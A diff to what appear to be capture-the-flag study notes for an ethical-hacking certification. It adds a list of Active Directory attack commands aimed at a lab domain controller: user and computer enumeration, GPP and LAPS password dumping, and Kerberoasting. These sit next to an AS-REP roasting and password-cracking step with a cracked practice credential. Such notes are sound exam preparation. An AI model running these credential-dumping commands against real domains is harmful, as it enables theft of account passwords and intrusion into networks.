@@ -154,6 +154,22 @@ You are assigned to analyse the domain controller from the target subnet and per
 GetNPUsers.py SKILL.CEH/ -no-pass -usersfile users.txt -dc-ip 192.168.0.222 -format john -outputfile hashes.asrep
 john --wordlist=rockyou.txt hashes.asrep
 $krb5asrep$Joshua@SKILL.CEH:c3ll0@123
+--------
+[Similar AD tools]
+# Enumerate domain computers
+GetADComputers.py SKILL.CEH/ -dc-ip 192.168.0.222
+
+# Dump Group Policy Preferences (GPP) passwords from SYSVOL
+Get-GPPPassword.py //SKILL.CEH/SYSVOL/SKILL.CEH/Policies/
+
+# Enumerate domain user accounts
+GetADUsers.py SKILL.CEH/ -dc-ip 192.168.0.222
+
+# Dump LAPS managed local administrator passwords
+GetLAPSPassword.py SKILL.CEH/ -dc-ip 192.168.0.222
+
+# Kerberoasting - Find user accounts with SPNs
+GetUserSPNs.py SKILL.CEH/ -dc-ip 192.168.0.222
 -------------------------------------------------------
 Challenge 8:
 A client machine under the target domain controller has a misconfigured SQL server vulnerability. Your task is to exploit this vulnerability, retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: N)
